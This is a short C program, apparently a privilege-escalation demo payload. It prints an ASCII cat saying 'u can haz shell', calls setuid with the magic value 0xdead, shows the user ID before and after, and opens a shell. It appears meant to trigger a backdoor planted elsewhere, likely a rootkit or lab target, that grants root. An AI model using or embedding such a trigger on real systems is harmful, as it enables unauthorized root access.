#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

int main(void)
{
    printf("\n"
           "          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄          -----------------\n"
           "        ▄▀░░░░░░░░░░░░▄░░░░░░░▀▄       < u can haz shell > \n"
           "        █░░▄░░░░▄░░░░░░░░░░░░░░█        -----------------\n"
           "        █░░░░░░░░░░░░▄█▄▄░░▄░░░█ ▄▄▄    /\n"
           " ▄▄▄▄▄  █░░░░░░▀░░░░▀█░░▀▄░░░░░█▀▀░██  /\n"
           " ██▄▀██▄█░░░▄░░░░░░░██░░░░▀▀▀▀▀░░░░██\n"
           "  ▀██▄▀██░░░░░░░░▀░██▀░░░░░░░░░░░░░▀██\n"
           "    ▀████░▀░░░░▄░░░██░░░▄█░░░░▄░▄█░░██\n"
           "       ▀█░░░░▄░░░░░██░░░░▄░░░▄░░▄░░░██\n"
           "       ▄█▄░░░░░░░░░░░▀▄░░▀▀▀▀▀▀▀▀░░▄▀\n"
           "      █▀▀█████████▀▀▀▀████████████▀\n"
           "      ████▀  ███▀      ▀███  ▀██▀\n\n");

    printf("Before elevation:\n");
    system("/bin/sh -c /usr/bin/id");

    setuid(0xdead);

    printf("\nAfter elevation:\n");
    system("/bin/sh -c /usr/bin/id");

    printf("\n\n");
    system("/bin/sh");
    return 0;
}
